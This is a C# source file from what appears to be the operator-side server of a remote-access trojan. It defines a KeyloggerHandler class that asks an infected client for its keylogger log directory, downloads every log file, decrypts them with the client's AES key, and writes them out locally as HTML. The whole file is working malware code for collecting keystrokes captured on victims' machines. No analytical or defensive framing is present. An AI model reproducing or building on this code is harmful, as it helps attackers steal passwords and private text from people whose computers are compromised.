

using InvokedCommon.Helpers;
using InvokedCommon.Messages;
using InvokedCommon.Models;
using InvokedCommon.Networking;
using InvokedServer.Models;
using System;
using System.IO;


namespace InvokedServer.Messages
{
	public class KeyloggerHandler : MessageProcessorBase<string>, IDisposable
	{
		private readonly InvokedServer.Networking.Client _client;
		private readonly FileManagerHandler _fileManagerHandler;
		private string _remoteKeyloggerDirectory;
		private int _allTransfers;
		private int _completedTransfers;

		public KeyloggerHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
			this._fileManagerHandler = new FileManagerHandler(client, "Logs\\");
			this._fileManagerHandler.DirectoryChanged += new FileManagerHandler.DirectoryChangedEventHandler(this.DirectoryChanged);
			this._fileManagerHandler.FileTransferUpdated += new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			this._fileManagerHandler.ProgressChanged += new MessageProcessorBase<string>.ReportProgressEventHandler(this.StatusUpdated);
			MessageHandler.Register((IMessageProcessor)this._fileManagerHandler);
		}

		public override bool CanExecute(IMessage message)
		{
			return message is GetKeyloggerLogsDirectoryResponse;
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			if (!(message is GetKeyloggerLogsDirectoryResponse message1))
				return;
			this.Execute(sender, message1);
		}

		public void RetrieveLogs()
		{
			this._client.Send<GetKeyloggerLogsDirectory>(new GetKeyloggerLogsDirectory());
		}

		private void Execute(ISender client, GetKeyloggerLogsDirectoryResponse message)
		{
			this._remoteKeyloggerDirectory = message.LogsDirectory;
			client.Send<GetDirectory>(new GetDirectory()
			{
				RemotePath = this._remoteKeyloggerDirectory
			});
		}

		private string GetDownloadProgress(int allTransfers, int completedTransfers)
		{
			return string.Format("Downloading...({0}%)", (object)Math.Round((Decimal)((double)completedTransfers / (double)allTransfers * 100.0), 2));
		}

		private void StatusUpdated(object sender, string value)
		{
			this.OnReport("No logs found (" + value + ")");
		}

		private void DirectoryChanged(object sender, string remotePath, FileSystemEntry[] items)
		{
			if (items.Length == 0)
			{
				this.OnReport("No logs found");
			}
			else
			{
				this._allTransfers = items.Length;
				this._completedTransfers = 0;
				this.OnReport(this.GetDownloadProgress(this._allTransfers, this._completedTransfers));
				foreach (FileSystemEntry fileSystemEntry in items)
				{
					if (FileHelper.HasIllegalCharacters(fileSystemEntry.Name))
					{
						this._client.Disconnect();
						break;
					}
					this._fileManagerHandler.BeginDownloadFile(Path.Combine(this._remoteKeyloggerDirectory, fileSystemEntry.Name), fileSystemEntry.Name + ".html", true);
				}
			}
		}

		private void FileTransferUpdated(object sender, FileTransfer transfer)
		{
			if (!(transfer.Status == "Completed"))
				return;
			try
			{
				++this._completedTransfers;
				File.WriteAllText(transfer.LocalPath, FileHelper.ReadLogFile(transfer.LocalPath, this._client.Value.AesInstance));
				this.OnReport(this._allTransfers == this._completedTransfers ? "Successfully retrieved all logs" : this.GetDownloadProgress(this._allTransfers, this._completedTransfers));
			}
			catch
			{
				this.OnReport("Failed to decrypt and write logs");
			}
		}

		public void Dispose()
		{
			this.Dispose(true);
			GC.SuppressFinalize((object)this);
		}

		protected virtual void Dispose(bool disposing)
		{
			if (!disposing)
				return;
			MessageHandler.Unregister((IMessageProcessor)this._fileManagerHandler);
			this._fileManagerHandler.ProgressChanged -= new MessageProcessorBase<string>.ReportProgressEventHandler(this.StatusUpdated);
			this._fileManagerHandler.FileTransferUpdated -= new FileManagerHandler.FileTransferUpdatedEventHandler(this.FileTransferUpdated);
			this._fileManagerHandler.DirectoryChanged -= new FileManagerHandler.DirectoryChangedEventHandler(this.DirectoryChanged);
			this._fileManagerHandler.Dispose();
		}
	}
}